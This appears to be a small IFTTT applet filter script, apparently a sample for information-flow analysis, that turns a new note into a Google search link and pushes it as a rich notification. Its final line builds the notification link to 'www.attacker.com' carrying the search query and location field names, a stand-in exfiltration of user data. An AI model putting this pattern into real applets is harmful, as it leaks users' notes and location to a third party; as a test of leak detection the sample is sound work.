// https://ifttt.com/applets/B6defMmr-sample-ifttt-filter-code-to-uri-encode-a-url

// Applet that sends a rich Notification from the IFTTT app with the result of a Google query

// Trigger: Note widget -> Any new note
//					DoNote.doNoteNewCommandCommon.{NoteText, NoteTextImageURL, ShareURL, Latitude,
//																				 Longitude, LocationMapURL, ImageURL, OccurredAt}
// Action: Notifications -> Send a rich notification from the IFTTT app
//				 IfNotifications.sendRichNotification.{skip, setTitle, setMessage, setLinkUrl, 
//																							 setImageUrl}

trigger_noteText = lbl('DoNote.doNoteNewCommandCommon.NoteText');

googleSearchLink = encodeURI(urlh("https://www.google.com/search?q=site:ifttt.com/applets+" + trigger_noteText));
sink('IfNotifications.sendRichNotification', 'setMessage', googleSearchLink);
sink('IfNotifications.sendRichNotification', 'setLinkUrl', urll("www.attacker.com?" + googleSearchLink + 'DoNote.doNoteNewCommandCommon.Latitute' + 'DoNote.doNoteNewCommandCommon.Longitude'));
